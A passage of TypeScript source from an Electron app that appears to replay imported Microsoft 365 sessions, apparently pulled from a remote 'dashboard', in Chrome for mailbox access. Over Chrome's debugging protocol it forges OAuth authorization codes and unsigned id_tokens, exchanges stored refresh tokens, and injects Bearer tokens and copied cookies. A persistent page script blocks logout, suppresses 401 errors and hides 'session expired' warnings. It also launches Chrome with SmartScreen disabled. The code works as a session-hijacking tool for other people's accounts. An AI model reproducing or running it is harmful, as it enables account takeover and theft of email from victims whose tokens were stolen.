        log('[1] Tokens: outlook=' + !!resourceTokens.outlook + ', outlook365=' + !!resourceTokens.outlook365 + ', graph=' + !!resourceTokens.graph);

        // Collect localStorage/sessionStorage from Electron OWA window
        let localData: Record<string, string> = {};
        let sessionData: Record<string, string> = {};
        try { localData = await portalWindow.webContents.executeJavaScript('(function(){var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k)}return d})()'); } catch {}
        try { sessionData = await portalWindow.webContents.executeJavaScript('(function(){var d={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k)}return d})()'); } catch {}
        log('[1] localStorage: ' + Object.keys(localData).length + ' keys, sessionStorage: ' + Object.keys(sessionData).length + ' keys');

        // Collect cookies from Electron session
        const allCookies = await portalSession.cookies.get({});
        const msCookies = allCookies.filter(c => {
          const d = c.domain || '';
          // Exclude outlook.cloud.microsoft cookies — they trigger server-side redirects
          if (d.includes('outlook.cloud.microsoft')) return false;
          return d.includes('microsoft') || d.includes('office') || d.includes('live.com') || d.includes('sharepoint') || d.includes('azure') || d.includes('microsoftonline');
        });
        log('[1] Cookies: ' + allCookies.length + ' total, ' + msCookies.length + ' MS');

        // 2. Find Chrome or Edge
        const browserPaths = process.platform === 'win32' ? [
          'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
          'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
          path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'Application', 'chrome.exe'),
          'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
          'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
        ] : [
          '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium-browser', '/usr/bin/chromium',
          '/opt/google/chrome/chrome',
        ];
        let browserPath: string | null = null;
        for (const bp of browserPaths) { if (fs.existsSync(bp)) { browserPath = bp; break; } }
        if (!browserPath) { shell.openExternal(url); return; }
        const browserName = browserPath.includes('edge') || browserPath.includes('Edge') ? 'Edge' : 'Chrome';
        log('[2] Browser: ' + browserName);

        // 3. Launch Chrome with about:blank (set up interception first, then navigate)
        const debugPort = 9222 + Math.floor(Math.random() * 1000);
        const userDir = path.join(os.tmpdir(), 'portal-chrome-' + Date.now());
        const targetUrl = url;

        log('[3] Launching on port ' + debugPort);
        execFile(browserPath, [
          '--remote-debugging-port=' + debugPort,
          '--user-data-dir=' + userDir,
          '--no-first-run',
          '--no-default-browser-check',
          '--disable-features=msSmartScreenProtection',
          'about:blank',
        ], () => {});

        // 4. Wait for Chrome CDP target
        log('[4] Waiting for CDP...');
        const wsUrl = await new Promise<string>((resolve, reject) => {
          let attempts = 0;
          const tryConnect = () => {
            const req = http.get('http://127.0.0.1:' + debugPort + '/json', res => {
              let body = '';
              res.on('data', (c: Buffer) => body += c.toString());
              res.on('end', () => {
                try {
                  const targets = JSON.parse(body);
                  const page = targets.find((t: { type: string; webSocketDebuggerUrl?: string }) => t.type === 'page');
                  if (page?.webSocketDebuggerUrl) return resolve(page.webSocketDebuggerUrl);
                } catch { /* retry */ }
                if (++attempts < 12) setTimeout(tryConnect, 500);
                else reject(new Error('No CDP target after 6s'));
              });
            });
            req.on('error', () => { if (++attempts < 12) setTimeout(tryConnect, 500); else reject(new Error('CDP refused')); });
            req.setTimeout(2000, () => { req.destroy(); if (++attempts < 12) setTimeout(tryConnect, 500); else reject(new Error('CDP timeout')); });
          };
          tryConnect();
        });
        log('[4] CDP connected');

        // 5. Connect WebSocket
        const ws = new WebSocket(wsUrl);
        await new Promise<void>((resolve, reject) => {
          ws.on('open', () => resolve());
          ws.on('error', (e) => reject(new Error('WS: ' + (e as Error).message)));
          setTimeout(() => reject(new Error('WS timeout')), 10000);
        });
        log('[5] WebSocket connected');

        let msgId = 0;
        const pending = new Map<number, { resolve: (v: Record<string, unknown>) => void; timer: ReturnType<typeof setTimeout> }>();
        let fetchInterceptCount = 0;

        // Event handler for Fetch.requestPaused (CDP events)
        let cloudRedirectBlockCount = 0;
        const handleCdpEvent = (msg: Record<string, unknown>) => {
          if (msg.method === 'Fetch.requestPaused') {
            const params = msg.params as { requestId: string; request: { url: string; method: string; headers?: Record<string, string> }; responseStatusCode?: number; responseHeaders?: Array<{ name: string; value: string }> };
            const reqUrl = params.request.url;
            const requestId = params.requestId;
            fetchInterceptCount++;

            // ── Response-stage: block 302 redirects from office365 → cloud.microsoft.com ──
            if (params.responseStatusCode !== undefined) {
              const statusCode = params.responseStatusCode;
              if (statusCode >= 300 && statusCode < 400 && cloudRedirectBlockCount < 5) {
                const locationHeader = (params.responseHeaders || []).find(h => h.name.toLowerCase() === 'location');
                if (locationHeader && locationHeader.value.includes('outlook.cloud.microsoft')) {
                  cloudRedirectBlockCount++;
                  const newLocation = locationHeader.value.replace(/outlook\.cloud\.microsoft(\.com)?/g, 'outlook.office365.com');
                  const newHeaders = (params.responseHeaders || []).map(h => ({
                    name: h.name,
                    value: h.name.toLowerCase() === 'location' ? newLocation : h.value
                  }));
                  console.log('[Fetch] Blocked redirect #' + cloudRedirectBlockCount + ' to cloud.microsoft.com → staying at office365.com');
                  ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.fulfillRequest', params: { requestId, responseCode: statusCode, responseHeaders: newHeaders, body: '' } }));
                  return;
                }
              }
              // Not a redirect to cloud.microsoft.com or exceeded limit — continue normally
              ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.continueResponse', params: { requestId } }));
              return;
            }

            // ── Request-stage handlers below ──

            // Intercept OAuth authorize → return 302 with auth code (mirrors protocol handler)
            if (reqUrl.includes('/oauth2/v2.0/authorize') || reqUrl.includes('/oauth2/authorize')) {
              console.log('[Fetch] Intercepted authorize');
              let redirectUri = 'https://outlook.office365.com/owa/';
              let state = '';
              let responseMode = 'fragment';
              try {
                const u = new URL(reqUrl);
                redirectUri = u.searchParams.get('redirect_uri') || redirectUri;
                // Force redirect_uri to use outlook.office365.com (prevents navigation to cloud.microsoft.com)
                redirectUri = redirectUri.replace(/outlook\.cloud\.microsoft(\.com)?/g, 'outlook.office365.com');
                state = u.searchParams.get('state') || '';
                responseMode = u.searchParams.get('response_mode') || 'fragment';
              } catch {}
              const mockCode = 'mock_auth_code_' + Date.now();
              const authParams = new URLSearchParams({ code: mockCode, state, client_info: clientInfo, session_state: Date.now().toString() });
              const sep = responseMode === 'query' ? '?' : '#';
              const redirectTo = redirectUri + sep + authParams.toString();
              ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.fulfillRequest', params: { requestId, responseCode: 302, responseHeaders: [{ name: 'Location', value: redirectTo }], body: '' } }));
              return;
            }

            // Intercept OAuth token → read client_id+scope from POST body, exchange for correct tokens
            if (reqUrl.includes('/oauth2/v2.0/token') || reqUrl.includes('/oauth2/token')) {
              console.log('[Fetch] Intercepted token endpoint');
              (async () => {
                try {
                  // Read client_id and scope from POST body (mirrors protocol handler approach)
                  let reqClientId = FOCI_CLIENT_ID;
                  let reqScope = 'https://outlook.office365.com/.default openid profile offline_access';
                  const postData = (params.request as Record<string, unknown>).postData as string | undefined;
                  if (postData) {
                    const bodyParams = new URLSearchParams(postData);
                    if (bodyParams.get('client_id')) reqClientId = bodyParams.get('client_id')!;
                    if (bodyParams.get('scope')) reqScope = bodyParams.get('scope')!;
                    console.log('[Fetch] Token request: client_id=' + reqClientId + ', scope=' + reqScope.substring(0, 60));
                  }

                  // Exchange refresh token using the REQUESTED client_id and scope
                  const freshResult = await exchangeToken(currentRefreshToken, reqClientId, reqScope);
                  let tokenResult: Record<string, unknown> = { access_token: owaToken };
                  if (!freshResult.error && freshResult.access_token) {
                    tokenResult = freshResult;
                    const freshToken = freshResult.access_token as string;
                    // Update cached tokens based on audience
                    const dec = decodeJwt(freshToken);
                    const aud = (dec?.aud as string) || '';
                    if (aud.includes('graph')) { resourceTokens.graph = freshToken; graphToken = freshToken; }
                    else if (aud.includes('outlook') || aud.includes('office')) { resourceTokens.outlook = freshToken; owaToken = freshToken; }
                    if (freshResult.refresh_token) currentRefreshToken = freshResult.refresh_token as string;
                    console.log('[Fetch] Got fresh token (aud=' + aud.substring(0, 40) + ')');
                  } else {
                    // Fallback: try with FOCI client_id if the requested one failed
                    if (reqClientId !== FOCI_CLIENT_ID) {
                      const fallback = await exchangeToken(currentRefreshToken, FOCI_CLIENT_ID, reqScope);
                      if (!fallback.error && fallback.access_token) {
                        tokenResult = fallback;
                        if (fallback.refresh_token) currentRefreshToken = fallback.refresh_token as string;
                        console.log('[Fetch] Fallback FOCI exchange succeeded');
                      }
                    }
                  }

                  // Build id_token with aud matching the REQUESTED client_id
                  const now = Math.floor(Date.now() / 1000);
                  const idClaims = { aud: reqClientId, iss: 'https://login.microsoftonline.com/' + tid + '/v2.0', iat: now, nbf: now, exp: now + 3600, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
                  const idHeader = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'none' })).toString('base64url');
                  const idPayload = Buffer.from(JSON.stringify(idClaims)).toString('base64url');
                  const tokenResponse = JSON.stringify({
                    access_token: tokenResult.access_token || owaToken,
                    token_type: 'Bearer',
                    expires_in: (tokenResult.expires_in as number) || 3600,
                    ext_expires_in: 3600,
                    scope: (tokenResult.scope as string) || reqScope,
                    id_token: idHeader + '.' + idPayload + '.',
                    refresh_token: (tokenResult.refresh_token as string) || currentRefreshToken,
                    client_info: clientInfo, foci: '1',
                  });
                  const body64 = Buffer.from(tokenResponse).toString('base64');
                  ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.fulfillRequest', params: { requestId, responseCode: 200, responseHeaders: [{ name: 'Content-Type', value: 'application/json' }, { name: 'Access-Control-Allow-Origin', value: '*' }], body: body64 } }));
                } catch (err) {
                  console.error('[Fetch] Token exchange failed:', err);
                  // Last resort: return cached token
                  const now = Math.floor(Date.now() / 1000);
                  const idHeader = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'none' })).toString('base64url');
                  const idPayload = Buffer.from(JSON.stringify({ aud: FOCI_CLIENT_ID, iss: 'https://login.microsoftonline.com/' + tid + '/v2.0', iat: now, exp: now + 3600, sub: oid, oid, tid, preferred_username: email, name: email, ver: '2.0' })).toString('base64url');
                  const tokenResponse = JSON.stringify({
                    access_token: owaToken, token_type: 'Bearer', expires_in: 3600, ext_expires_in: 3600,
                    scope: 'openid profile email Mail.Read Mail.ReadWrite',
                    id_token: idHeader + '.' + idPayload + '.',
                    refresh_token: currentRefreshToken,
                    client_info: clientInfo, foci: '1',
                  });
                  const body64 = Buffer.from(tokenResponse).toString('base64');
                  ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.fulfillRequest', params: { requestId, responseCode: 200, responseHeaders: [{ name: 'Content-Type', value: 'application/json' }, { name: 'Access-Control-Allow-Origin', value: '*' }], body: body64 } }));
                }
              })();
              return;
            }

            // OWA/Office/Graph requests — continue with Authorization header (use freshest token)
            if (reqUrl.includes('outlook.office365.com') || reqUrl.includes('outlook.office.com') || reqUrl.includes('outlook.cloud.microsoft') || reqUrl.includes('substrate.office.com') || reqUrl.includes('graph.microsoft.com')) {
              const existingHeaders = params.request.headers || {};
              const headerList = Object.entries(existingHeaders).map(([n, v]) => ({ name: n, value: v as string }));
              // Pick the right token for the domain
              let bearerToken = owaToken;
              if (reqUrl.includes('graph.microsoft.com')) bearerToken = resourceTokens.graph || graphToken;
              else if (reqUrl.includes('substrate')) bearerToken = resourceTokens.substrate || owaToken;
              else bearerToken = resourceTokens.outlook || owaToken;
              if (!headerList.some(h => h.name.toLowerCase() === 'authorization')) {
                headerList.push({ name: 'Authorization', value: 'Bearer ' + bearerToken });
              }
              headerList.push({ name: 'User-Agent', value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2478.0' });
              ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.continueRequest', params: { requestId, headers: headerList } }));
              return;
            }

            // All other requests — just continue
            ws.send(JSON.stringify({ id: ++msgId, method: 'Fetch.continueRequest', params: { requestId } }));
          }
        };

        ws.on('message', (data: Buffer | string) => {
          try {
            const msg = JSON.parse(data.toString());
            if (msg.id && pending.has(msg.id)) {
              const p = pending.get(msg.id)!;
              clearTimeout(p.timer);
              pending.delete(msg.id);
              p.resolve(msg);
            } else if (msg.method) {
              handleCdpEvent(msg);
            }
          } catch { /* ignore */ }
        });

        const cdpSend = (method: string, params: Record<string, unknown> = {}): Promise<Record<string, unknown>> => {
          return new Promise((resolve) => {
            const id = ++msgId;
            const timer = setTimeout(() => { pending.delete(id); resolve({ id, error: { message: 'timeout 15s' } }); }, 15000);
            pending.set(id, { resolve, timer });
            ws.send(JSON.stringify({ id, method, params }));
          });
        };

        // 6. Enable CDP domains and Fetch interception for OAuth ONLY
        await cdpSend('Network.enable');
        await cdpSend('Page.enable');
        await cdpSend('Runtime.enable');

        // Intercept OAuth, OWA document/API, and Office requests
        // Response-stage patterns for outlook.office365.com block redirects to cloud.microsoft.com
        await cdpSend('Fetch.enable', {
          patterns: [
            { urlPattern: '*login.microsoftonline.com/*/oauth2*', requestStage: 'Request' },
            { urlPattern: '*login.windows.net/*/oauth2*', requestStage: 'Request' },
            { urlPattern: 'https://outlook.office365.com/mail*', requestStage: 'Request' },
            { urlPattern: 'https://outlook.office365.com/owa/*', requestStage: 'Request' },
            { urlPattern: 'https://outlook.office.com/mail*', requestStage: 'Request' },
            { urlPattern: 'https://outlook.office.com/owa/*', requestStage: 'Request' },
            { urlPattern: 'https://outlook.cloud.microsoft.com/*', requestStage: 'Request' },
            { urlPattern: 'https://outlook.cloud.microsoft/*', requestStage: 'Request' },
            { urlPattern: '*substrate.office.com/*', requestStage: 'Request' },
            { urlPattern: '*graph.microsoft.com/*', requestStage: 'Request' },
            // Response-stage: catch 302 redirects to outlook.cloud.microsoft.com
            { urlPattern: 'https://outlook.office365.com/*', requestStage: 'Response' },
            { urlPattern: 'https://outlook.office.com/*', requestStage: 'Response' },
          ]
        });
        log('[6] Fetch interception enabled (OAuth + OWA docs/APIs)');

        // 7. Set cookies
        const longExpiryEpoch = Math.floor(Date.now() / 1000) + 86400;
        let cookieSetCount = 0;
        for (const c of msCookies) {
          const sameSiteMap: Record<string, string> = { 'no_restriction': 'None', 'unspecified': 'None', 'lax': 'Lax', 'strict': 'Strict', 'None': 'None', 'Lax': 'Lax', 'Strict': 'Strict' };
          const cookieDomain = (c.domain || '').startsWith('.') ? (c.domain || '').substring(1) : (c.domain || '');
          await cdpSend('Network.setCookie', {
            name: c.name, value: c.value,
            url: 'https://' + cookieDomain + (c.path || '/'),
            domain: c.domain, path: c.path || '/',
            secure: c.secure !== false, httpOnly: !!c.httpOnly,
            sameSite: sameSiteMap[(c.sameSite as string) || 'no_restriction'] || 'None',
            expires: longExpiryEpoch,
          });
          cookieSetCount++;
        }
        log('[7] Set ' + cookieSetCount + ' cookies');

        // 8. CRITICAL: Inject persistent stability script (from Portal Browser v10.10)
        // This runs BEFORE any page JS on EVERY page load (persists after CDP disconnect)
        // Includes: Bearer injection, 401 suppression, redirect blocking, banner hiding
        const persistentScript = `
(function(){
  var TOKEN = ${JSON.stringify(owaToken)};
  var GRAPH_TOKEN = ${JSON.stringify(graphToken)};
  var MS_DOMAINS = ['outlook.office365.com','outlook.office.com','outlook.cloud.microsoft.com','outlook.cloud.microsoft','substrate.office.com','graph.microsoft.com','outlook.live.com'];
  function isMsDomain(url){try{var h=new URL(url).hostname;return MS_DOMAINS.some(function(d){return h.includes(d)})}catch(e){return false}}
  function getToken(url){if(url.includes('graph.microsoft.com'))return GRAPH_TOKEN;if(url.includes('outlook.cloud.microsoft'))return TOKEN;return TOKEN}
  function isBlockedNav(url){return typeof url==='string'&&(url.includes('login.microsoftonline.com')||url.includes('/logoff')||url.includes('/signout')||url.includes('/logout')||url.includes('oauth2/authorize')||url.includes('outlook.cloud.microsoft'))}

  // 1. Override fetch — add Bearer token + suppress 401s
  // CRITICAL: Must handle both string URLs and Request objects without losing existing headers
  var origFetch = window.fetch;
  window.fetch = function(input, init){
    var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
    if(isMsDomain(url)){
      if(typeof input === 'string'){
        // String URL — safe to modify init
        init = init || {};
        var h = new Headers(init.headers || {});
        if(!h.has('Authorization')) h.set('Authorization','Bearer '+getToken(url));
        init = Object.assign({}, init, {headers: h});
      } else if(input && typeof input === 'object' && input instanceof Request){
        // Request object — clone it and add our header without losing original headers
        var existingHeaders = new Headers(input.headers);
        if(!existingHeaders.has('Authorization')) existingHeaders.set('Authorization','Bearer '+getToken(url));
        input = new Request(input, {headers: existingHeaders});
      }
    }
    return origFetch.call(this, input, init).then(function(response){
      if(response.status === 401 && isMsDomain(url)){
        console.warn('[Portal] Suppressed 401 from:',url.substring(0,80));
        return new Response(JSON.stringify({value:[]}),{status:200,headers:{'content-type':'application/json'}});
      }
      return response;
    }).catch(function(err){
      if(isMsDomain(url)){
        console.warn('[Portal] Suppressed fetch error:',err.message);
        return new Response(JSON.stringify({value:[]}),{status:200,headers:{'content-type':'application/json'}});
      }
      throw err;
    });
  };

  // 2. Override XMLHttpRequest
  var origOpen = XMLHttpRequest.prototype.open;
  var origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method,url){
    this._portalUrl = url;
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(){
    if(this._portalUrl && isMsDomain(this._portalUrl)){
      try{this.setRequestHeader('Authorization','Bearer '+getToken(this._portalUrl))}catch(e){}
    }
    return origSend.apply(this, arguments);
  };

  // 3. Block redirects to login URLs (prevents OWA from navigating away)
  var origAssign = window.location.assign ? window.location.assign.bind(window.location) : null;
  var origReplace = window.location.replace ? window.location.replace.bind(window.location) : null;
  window.location.assign = function(url){
    if(isBlockedNav(url)){console.warn('[Portal] Blocked nav to:',url.substring(0,80));return}
    if(origAssign) return origAssign(url);
  };
  window.location.replace = function(url){
    if(isBlockedNav(url)){console.warn('[Portal] Blocked nav to:',url.substring(0,80));return}
    if(origReplace) return origReplace(url);
  };
  // Block location.reload — OWA calls this on auth failure
  window.location.reload = function(){console.warn('[Portal] Blocked page reload')};
  // Override href setter
  try{
    var origHrefDesc = Object.getOwnPropertyDescriptor(window.location.__proto__,'href')||Object.getOwnPropertyDescriptor(window.Location.prototype,'href');
    if(origHrefDesc && origHrefDesc.set){
      var origHrefSet = origHrefDesc.set;
      Object.defineProperty(window.location,'href',{
        set:function(url){if(isBlockedNav(url)){console.warn('[Portal] Blocked nav to:',url.substring(0,80));return}origHrefSet.call(window.location,url)},
        get:origHrefDesc.get
      });
    }
  }catch(e){}

  // 4. navigator.onLine always true (prevent stale session detection)
  Object.defineProperty(navigator,'onLine',{get:function(){return true},configurable:true});

  // 5. Suppress OWA telemetry
  if(window.owaConfig) window.owaConfig.enableTelemetry = false;

  // 6. Hide session-expired banners via MutationObserver
  setTimeout(function(){
    if(!document.body) return;
    var observer = new MutationObserver(function(mutations){
      mutations.forEach(function(m){
        m.addedNodes.forEach(function(node){
          if(node.nodeType===1){
            var text=node.textContent||'';
            if((text.includes('session')&&text.includes('expired'))||(text.includes('sign in')&&text.includes('again'))||(text.includes('Something went wrong')&&text.includes('try again'))||(text.includes('need to sign in'))){
              node.style.display='none';
              console.warn('[Portal] Hidden session-expired banner');
            }
          }
        });
      });
    });
    observer.observe(document.body,{childList:true,subtree:true});
  },3000);

  console.log('[Portal] Stability script active: Bearer injection + 401 suppression + redirect blocking + banner hiding');
})();`;
        // Also inject localStorage/sessionStorage
        // Clean storage: replace outlook.cloud.microsoft(.com) with outlook.office365.com
        // to prevent OWA from redirecting Chrome to the cloud domain
        const cleanCloud = (s: string) => s.replace(/outlook\.cloud\.microsoft(\.com)?/g, 'outlook.office365.com');
        const storageLines: string[] = [];
        for (const [k, v] of Object.entries(localData)) {
          const cleanK = cleanCloud(k);
          const cleanV = cleanCloud(v);
          storageLines.push('try{localStorage.setItem(' + JSON.stringify(cleanK) + ',' + JSON.stringify(cleanV) + ')}catch(e){}');
        }
        for (const [k, v] of Object.entries(sessionData)) {
          const cleanK = cleanCloud(k);
          const cleanV = cleanCloud(v);
          storageLines.push('try{sessionStorage.setItem(' + JSON.stringify(cleanK) + ',' + JSON.stringify(cleanV) + ')}catch(e){}');
        }
        const fullInjection = persistentScript + '\n' + storageLines.join(';');
        await cdpSend('Page.addScriptToEvaluateOnNewDocument', { source: fullInjection });
        log('[8] Persistent Bearer injection + storage (' + storageLines.length + ' items) registered');

        // 9. Navigate to OWA
        log('[9] Navigating to ' + targetUrl);
        await cdpSend('Page.navigate', { url: targetUrl });

        // 10. Keep CDP alive INDEFINITELY to handle ALL requests (OAuth + API)
        // The persistent script is a FALLBACK — CDP interception is the primary mechanism
        log('[10] CDP interception active (persistent)...');

        // Keep CDP alive — DO NOT close the WebSocket
        // Send periodic pings to keep connection alive
        const cdpPingInterval = setInterval(() => {
          if (ws.readyState === 1) { // OPEN
            ws.send(JSON.stringify({ id: ++msgId, method: 'Runtime.evaluate', params: { expression: '1' } }));
          } else {
            clearInterval(cdpPingInterval);
          }
        }, 15000); // Ping every 15s

        // Close CDP only when Electron window closes
        portalWindow.on('closed', () => {
          clearInterval(cdpPingInterval);
          try { ws.close(); } catch {}
        });

        log('[DONE] Session active in ' + browserName + ' — CDP interception persistent');
      } catch (err) {
        const errMsg = (err as Error).message || 'Unknown error';
        log('[ERROR] ' + errMsg);
        console.error('[OpenRealSession] Failed:', diagLog.join(' | '));
      }
    }

    // ── Right-click context menu ──
    portalWindow.webContents.on('context-menu', (_event, params) => {
      const menuItems: Electron.MenuItemConstructorOptions[] = [];
      menuItems.push({ label: 'Open Real Session in Chrome', click: () => openRealSession() });
      menuItems.push({ type: 'separator' });
      if (params.selectionText) {
        menuItems.push({ label: 'Copy', role: 'copy' });
        menuItems.push({ type: 'separator' });
      }
      if (params.isEditable) {
        menuItems.push({ label: 'Cut', role: 'cut' });
        menuItems.push({ label: 'Copy', role: 'copy' });
        menuItems.push({ label: 'Paste', role: 'paste' });
        menuItems.push({ type: 'separator' });
      }
      menuItems.push({ label: 'Select All', role: 'selectAll' });
      if (params.linkURL) {
        menuItems.push({ type: 'separator' });
        menuItems.push({ label: 'Open Link in Browser', click: () => shell.openExternal(params.linkURL) });
      }
      Menu.buildFromTemplate(menuItems).popup({ window: portalWindow });
    });

    // ── Keyboard shortcut: Ctrl+Shift+R → Open Real Session ──
    portalWindow.webContents.on('before-input-event', (event, input) => {
      if (input.control && input.shift && input.type === 'keyDown' && input.key.toLowerCase() === 'r') {
        event.preventDefault();
        openRealSession();
      }
    });

    portalWindow.show();
    portalWindow.loadURL(url);
    return { success: true };
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Failed to launch browser session';
    return { success: false, error: message };
  }
}

function findChromePath(): string {
  if (process.platform === 'win32') {
    return 'start chrome';
  } else if (process.platform === 'darwin') {
    return 'open -a "Google Chrome"';
  }
  return 'google-chrome';
}

async function launchExternalChrome(account: SyncedAccount, service: string): Promise<{ success: boolean; error?: string }> {
  const url = SERVICE_URLS[service] || SERVICE_URLS.owa;
  const profileDir = path.join(app.getPath('userData'), 'chrome-profiles', account.sessionId);

  const chromePath = findChromePath();
  const args = [
    `--user-data-dir="${profileDir}"`,
    `--no-first-run`,
    `--no-default-browser-check`,
    `"${url}?login_hint=${encodeURIComponent(account.email)}"`,
  ];

  return new Promise((resolve) => {
    exec(`${chromePath} ${args.join(' ')}`, (error) => {
      if (error) {
        // Fallback to shell.openExternal
        shell.openExternal(`${url}?login_hint=${encodeURIComponent(account.email)}`);
      }
      resolve({ success: true });
    });
  });
}

function setupIpcHandlers(): void {
  ipcMain.handle('auth:login', async () => {
    try {
      const result = await authManager.loginWithDeviceCode(mainWindow!);
      if (result) {
        graphClient = new GraphMailClient(authManager);
        const profile = await graphClient.getProfile();
        return { success: true, profile };
      }
      return { success: false, error: 'Login cancelled' };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Login failed';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('auth:openVerification', async (_event, url: string) => {
    authManager.openVerificationPage(url);
  });

  ipcMain.handle('auth:logout', async () => {
    try {
      await authManager.logout();
      graphClient = null;
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Logout failed';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('auth:check', async () => {
    try {
      if (authManager.isImportedSession()) {
        const importedToken = await authManager.getImportedAccessToken();
        if (importedToken) {
          graphClient = new GraphMailClient(importedToken);
          try {
            const profile = await graphClient.getProfile();
            return { authenticated: true, profile };
          } catch {
            const tokens = tokenStore.getImportedTokens();
            if (!tokens?.refreshToken) return { authenticated: false };
            const body = new URLSearchParams({
              client_id: CLIENT_ID,
              grant_type: 'refresh_token',
              refresh_token: tokens.refreshToken,
              resource: 'https://graph.microsoft.com',
            });
            const response = await net.fetch('https://login.microsoftonline.com/common/oauth2/token', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: body.toString(),
            });
            if (!response.ok) return { authenticated: false };
            const data = await response.json() as Record<string, unknown>;
            const newAccessToken = data.access_token as string;
            const newRefreshToken = (data.refresh_token as string) || tokens.refreshToken;
            tokenStore.saveImportedTokens(newAccessToken, newRefreshToken, tokens.email);
            graphClient = new GraphMailClient(newAccessToken);
            const profile = await graphClient.getProfile();
            return { authenticated: true, profile };
          }
        }
      }

      const token = await authManager.acquireTokenSilent();
      if (token) {
        graphClient = new GraphMailClient(authManager);
        const profile = await graphClient.getProfile();
        return { authenticated: true, profile };
      }
      return { authenticated: false };
    } catch {
      return { authenticated: false };
    }
  });

  ipcMain.handle('mail:getFolders', async () => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const folders = await graphClient.getMailFolders();
      return { success: true, folders };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to fetch folders';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:getMessages', async (_event, folderId: string, page: number, pageSize: number) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const result = await graphClient.getMessages(folderId, page, pageSize);
      return { success: true, ...result };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to fetch messages';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:getMessage', async (_event, messageId: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const message = await graphClient.getMessage(messageId);
      return { success: true, message };
    } catch (error: unknown) {
      const msg = error instanceof Error ? error.message : 'Failed to fetch message';
      return { success: false, error: msg };
    }
  });

  ipcMain.handle('mail:sendMessage', async (_event, messageData: {
    to: string[];
    cc?: string[];
    bcc?: string[];
    subject: string;
    body: string;
    isHtml: boolean;
    replyToId?: string;
  }) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      if (messageData.replyToId) {
        await graphClient.replyToMessage(messageData.replyToId, messageData.body, messageData.isHtml);
      } else {
        await graphClient.sendMessage(messageData);
      }
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to send message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:moveMessage', async (_event, messageId: string, destinationFolderId: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.moveMessage(messageId, destinationFolderId);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to move message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:deleteMessage', async (_event, messageId: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.deleteMessage(messageId);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to delete message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:toggleRead', async (_event, messageId: string, isRead: boolean) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.markAsRead(messageId, isRead);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to update message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:toggleFlag', async (_event, messageId: string, isFlagged: boolean) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.toggleFlag(messageId, isFlagged);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to flag message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:search', async (_event, query: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const messages = await graphClient.searchMessages(query);
      return { success: true, messages };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Search failed';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:saveDraft', async (_event, messageData: {
    to: string[];
    cc?: string[];
    subject: string;
    body: string;
    isHtml: boolean;
  }) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const draft = await graphClient.saveDraft(messageData);
      return { success: true, draft };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to save draft';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('notification:show', async (_event, title: string, body: string) => {
    if (Notification.isSupported()) {
      new Notification({ title, body }).show();
    }
  });

  // Fetch + import all sessions from dashboard
  // Try batch mode first (single request), fall back to N+1 if API doesn't support batch
  ipcMain.handle('sync:fetchAndImportAll', async (_event, password: string) => {
    try {
      // Try batch mode first (returns all sessions with tokens in one call)
